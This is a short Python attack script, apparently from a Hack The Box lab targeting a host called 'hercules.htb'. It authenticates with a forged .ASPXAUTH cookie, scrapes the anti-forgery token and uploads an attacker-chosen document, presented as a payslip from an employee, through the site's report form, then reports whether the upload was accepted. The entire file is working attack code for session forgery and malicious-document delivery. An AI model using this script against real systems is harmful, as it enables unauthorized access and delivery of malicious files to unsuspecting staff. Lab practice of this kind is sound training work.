#!/usr/bin/env python3
import re, sys, os, requests, urllib3
urllib3.disable_warnings()

BASE = "https://10.129.242.196"
COOKIE = "/home/kali/hercules/forged.cookie"
path = sys.argv[1]
ctype = {"odt": "application/vnd.oasis.opendocument.text",
         "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
         "zip": "application/zip"}.get(path.rsplit(".", 1)[-1], "application/octet-stream")

s = requests.Session(); s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.cookies.set(".ASPXAUTH", open(COOKIE).read().strip(), domain="10.129.242.196")

r = s.get(f"{BASE}/Home/Forms", timeout=20)
tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text).group(1)

r2 = s.post(f"{BASE}/Home/Forms",
            data={"Name": "Ken", "Email": "ken.w@hercules.htb",
                  "Description": "Please review my attached payslip, thanks!",
                  "__RequestVerificationToken": tok},
            files={"UploadedFile": (os.path.basename(path), open(path, "rb"), ctype)},
            timeout=90)
body = re.sub(r'<[^>]+>', ' ', r2.text)
body = re.sub(r'\s+', ' ', body)
for kw in ("Thank you for your report!", "not supported", "too large", "not permitted"):
    if kw.lower() in body.lower():
        print(f"{os.path.basename(path)}: {r2.status_code} -> {kw}")
        break
else:
    print(f"{os.path.basename(path)}: {r2.status_code} -> (unknown) {body[-300:]}")
